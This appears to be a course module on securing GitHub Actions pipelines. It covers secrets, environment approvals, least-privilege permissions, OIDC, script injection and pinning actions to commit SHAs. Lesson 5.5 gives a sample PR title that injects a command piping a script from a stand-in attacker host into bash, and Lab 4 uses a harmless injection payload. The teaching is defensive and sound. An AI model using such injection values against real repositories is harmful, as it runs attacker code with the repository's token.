# CI/CD Module 05 — Secrets, Environments & Pipeline Security 🔴

## 🎯 Objectives
- Store **secrets** and **variables** at repository and environment level, and keep them out of logs
- Gate production deploys with **environments**: required reviewers and branch rules
- Give every job the **least privilege** with `permissions:`
- Log in to the cloud **without stored keys** using **OIDC**
- Defend against **script injection**, untrusted pull requests and **compromised actions**
- Audit workflows automatically with actionlint and **zizmor**; pin actions to commit SHAs

## 🧠 Why DevOps engineers care
A CI system holds the keys to production: cloud credentials, registry tokens, deploy rights. That makes pipelines a
favourite target. In March 2025 a popular action (`tj-actions/changed-files`) was compromised and its tags were moved
to malicious code that dumped secrets from thousands of repositories' logs. Teams that had pinned actions to commit
SHAs and kept tokens short-lived were not affected. Pipeline security is now part of every DevOps job.

---

## 📖 Lesson 5.1 — Secrets and variables

| | Where | Visible? | Use for |
|--|-------|----------|---------|
| **Secret** | Settings → Secrets and variables → Actions | masked as `***` in logs | tokens, passwords, keys |
| **Variable** (`vars.X`) | same page, "Variables" tab | plain text | region, URLs, feature flags |
| **Environment** secret/variable | Settings → Environments → *name* | same rules | different values per environment |

```yaml
      - env:
          API_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
          REGION: ${{ vars.REGION }}
        run: ./deploy.sh                      # read $API_TOKEN inside the script
```
Rules: never `echo` a secret; secrets are **not** given to workflows triggered by pull requests from **forks**;
a secret you derive (e.g. a token you fetched) should be masked with `echo "::add-mask::$VALUE"`.

## 📖 Lesson 5.2 — Environments: approvals and rules

```yaml
  production:
    needs: staging
    environment:
      name: production
      url: https://www.example.com
```
In **Settings → Environments → production**: **Required reviewers** (the job waits for an approval),
**Deployment branches** = `main` only, optional **wait timer**. The deployment and who approved it are recorded on
the repo's **Deployments** page — your audit trail.

## 📖 Lesson 5.3 — Least privilege for `GITHUB_TOKEN`

Every run gets a `GITHUB_TOKEN`. Give it nothing by default, then exactly what each job needs:
```yaml
permissions: {}                 # workflow level: nothing

jobs:
  build:
    permissions:
      contents: read            # checkout
      packages: write           # push to GHCR
```
Also in **Settings → Actions → General → Workflow permissions**: choose *Read repository contents*.
And check out without leaving the token on disk:
```yaml
      - uses: actions/checkout@v7
        with:
          persist-credentials: false
```

## 📖 Lesson 5.4 — OIDC: cloud access without stored keys

Long-lived cloud keys in secrets leak, get copied and never rotate. With **OIDC**, GitHub gives each job a signed,
short-lived identity token, and the cloud trades it for 1-hour credentials — **only** if the token says the right
repo, branch or environment:
```
 job ──(OIDC token: repo:you/cicd-lab:environment:production)──► AWS STS ──► temporary credentials (1 h)
```
```yaml
permissions:
  id-token: write
  contents: read
...
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
          aws-region: eu-west-1
      - run: aws sts get-caller-identity
```
The AWS side ([`aws-oidc-trust-policy.json`](solutions/aws-oidc-trust-policy.json)) trusts GitHub's OIDC provider
but **only** for `repo:YOUR-USER/cicd-lab:environment:production`. You'll build it with Terraform in Phase 11.
Azure, Google Cloud and HashiCorp Vault support the same pattern.

## 📖 Lesson 5.5 — Script injection and untrusted input

```yaml
      # ❌ the PR title is pasted INTO the script before bash runs it
      - run: |
          echo "Thanks for: ${{ github.event.pull_request.title }}"
```
A PR titled `x"; curl -s https://evil.example/x.sh | bash; echo "` runs the attacker's code with your token.
```yaml
      # ✅ pass untrusted text as DATA through env, and quote it
      - env:
          TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "Thanks for: $TITLE"
```
Untrusted: PR titles and bodies, branch names, issue and comment text, commit messages — anything an outsider types.
Also avoid **`pull_request_target`** (runs with secrets in the context of the base repo) unless you never check out
or run the PR's code.

## 📖 Lesson 5.6 — Supply chain: pin, update, audit

```yaml
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```
A tag like `@v7` can be moved by whoever controls that repo; a 40-character commit SHA can't.
[`pin_actions.sh`](solutions/pin_actions.sh) rewrites `@vX` to the SHA of the newest `vX.*` release, and
**Dependabot** ([`dependabot.yml`](solutions/dot-github/dependabot.yml)) opens PRs to update the pins weekly.

Audit everything with [`audit_workflows.sh`](solutions/audit_workflows.sh):
```
actionlint (syntax + shellcheck)    ✅
zizmor (security linter)            ✅      ← injection, permissions, unpinned uses, credential persistence...
third-party actions pinned to SHAs  ✅
top-level permissions declared      ✅
no pull_request_target              ✅
```

---

## ⚠️ Common mistakes
- Long-lived cloud keys in secrets instead of OIDC
- `permissions: write-all` (or no `permissions:` block on an old repo with write defaults)
- `${{ github.event.* }}` inside `run:` — script injection
- Third-party actions on moving tags, never updated
- Production deploys with no environment protection — any push to `main` (or any branch!) can deploy
- Printing secrets "just to debug" — logs are kept and readable by everyone with repo access

---

## 🧪 Labs
Solutions: [`solutions/`](solutions/).

### Lab 1 ⭐ — Secrets and variables
Create a repository variable `REGION` and an environment secret `DEPLOY_TOKEN` with different values in `staging`
and `production`. Print the region and the **length** of the token. Try `echo $DEPLOY_TOKEN` and see the `***`.

### Lab 2 ⭐⭐ — Approval gate
Write `deploy-environments.yml`: `staging` runs automatically on `main`, `production` waits for your approval and is
limited to the `main` branch. Approve one run and reject another; look at the **Deployments** page.

### Lab 3 ⭐⭐⭐ — OIDC to AWS (needs an AWS account; or read it now and do it in Phase 11)
Create the GitHub OIDC identity provider and a role with the trust policy in the solutions (your repo, environment
`production`). Run `aws-oidc.yml` → `aws sts get-caller-identity`. Then run it from another branch without the
environment and watch AWS refuse.

### Lab 4 ⭐⭐ — Injection
In a throwaway repo, add `injection-bad.yml`, open a PR with the title `x"; echo HACKED; echo "` and find `HACKED`
in the log. Fix it the `injection-fixed.yml` way and repeat. Run `actionlint` on both.

### Lab 5 ⭐⭐⭐ — Lock it down
For every workflow in your lab repo: top-level `permissions:`, `persist-credentials: false`, actions pinned with
`pin_actions.sh`, Dependabot enabled. Make `audit_workflows.sh` pass (install `zizmor` with `pip install zizmor`).

---

## ✅ Checkpoint
- [ ] I know when to use secrets, variables and environment-level values, and never print secrets
- [ ] Production deploys need an approval and only come from `main`
- [ ] Every workflow has least-privilege `permissions:`
- [ ] I can explain OIDC and why it beats stored keys
- [ ] I can spot and fix script injection, and I pin and audit the actions I use

👉 Next: [Module 06 — Reusable Workflows & Custom Actions](../06-reusable-workflows-and-actions/README.md)
